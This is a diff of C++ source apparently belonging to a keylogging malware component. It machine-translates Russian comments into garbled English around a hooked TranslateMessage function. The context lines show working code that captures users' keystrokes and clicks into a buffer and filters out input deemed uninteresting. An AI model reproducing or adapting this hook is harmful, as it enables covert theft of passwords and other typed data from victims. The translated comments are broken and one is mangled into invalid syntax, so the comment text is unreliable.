@@ -22,16 +22,14 @@ static CRITICAL_SECTION userInputCs;
 static LPWSTR userInputBuffer;
 static WORD userInputBufferSize;
 
-/*
-  Добавление строки в буффер ввода.
+/*В В Add a row in the input buffer.
 
-  IN string - строка для добавления.
-*/
+В В IN string - string to add.*/
 static void addString(const LPWSTR string)
 {
   int stringSize = Str::_LengthW(string);
   
-  //Если строка слишком длинная, эти данные нас врятли интересуют. Поэтому сбрасываем буфер.
+  //If the string is too long, these data have vryatli interest. Therefore, reset the buffer.
   if(stringSize > USERINPUT_MAX_CHARS)UserHook::clearInput();
   else
   {
@@ -118,7 +116,7 @@ DWORD UserHook::getInput(LPWSTR *buffer)
       *buffer = p;
       retVal = userInputBufferSize;
       
-      //Убираем служебные символы.
+      //Remove special characters.
       for(DWORD i = 0; i < userInputBufferSize; i++)if(p[i] < 0x20)p[i] = 0x20;
     }
   }
@@ -128,7 +126,7 @@ DWORD UserHook::getInput(LPWSTR *buffer)
 
 BOOL WINAPI UserHook::hookerTranslateMessage(const MSG *msg)
 {
-  //WDEBUG0(WDDT_INFO, "Called"); //Тормаза дает.
+  //WDEBUG0 (WDDT_INFO, "Called"); / / slows down yields.
   if(msg != NULL && Core::isActive())
   {
     if(msg->message == WM_LBUTTONDOWN)
@@ -172,7 +170,7 @@ BOOL WINAPI UserHook::hookerTranslateMessage(const MSG *msg)
       {
         
         if(count == 1 && msg->wParam == VK_BACK)addString(L"\x2190");
-        //else if(count == 1 && msg->wParam == VK_DELETE)addString(L"\x2193");
+        //else if (count == 1 & & msg-> wParam == VK_DELETE) addString (L "\ x2193");
         else if(count > 1 || buf[0] >= 0x20)
         {
           buf[count] = 0;
